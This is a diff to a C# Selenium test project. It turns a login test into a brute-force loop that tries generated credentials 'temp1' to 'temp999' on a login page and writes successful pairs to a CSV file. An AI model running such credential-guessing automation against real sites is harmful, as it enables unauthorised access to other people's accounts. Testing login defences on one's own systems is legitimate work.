@@ -1,30 +1,53 @@
-﻿using System.Threading;
+﻿using System;
+using System.IO;
 using MyFramework.Page_Objects;
-using NUnit.Framework;
 
 namespace MyFramework
 {
     class Tests : BaseTest
     {
-        [Test]
-        public void FirstTest()
+
+        static void Main(string[] args)
         {
+            Tests tests = new Tests();
+
+            tests.BornDriver();
+
+            tests.Test();
+
+            tests.DieDriver();
+        }
+
+        public void Test()
+        {
+            string username;
+            string password;
 
             HomePage PageHome = new HomePage(driver);
-            PageHome.Open().
-                ClickLogin();
+
+            PageHome.Open().ClickLogin();
 
             LoginPage PageLogin = new LoginPage(driver);
-            PageLogin.Login("username","password");
-            Thread.Sleep(3000);
-            PageLogin.ClearUsernameField();
-            PageLogin.Login("newuser", "password");
-            Thread.Sleep(5000);
 
-
-
-            //wait.Until(ExpectedConditions.ElementToBeClickable(Password));
-            //By searchBox
+            using (StreamWriter file = new StreamWriter(@"brute-force_results.csv", true))
+            {
+                for (int i = 1; i < 1000; i++)
+                {
+                    username = "temp" + i;
+                    password = "temp" + i;
+                    Console.Write("try: " + username+","+password);
+                    if (PageLogin.Login(username, password))
+                    {
+                        file.WriteLine(username + ',' + password);
+                        Console.WriteLine(" - successfull login !!!");
+                        PageHome.ClickLogout();
+                    }
+                    else
+                    {
+                        Console.WriteLine(" - fail to login");
+                    }
+                }
+            }        
         }
     }
 }
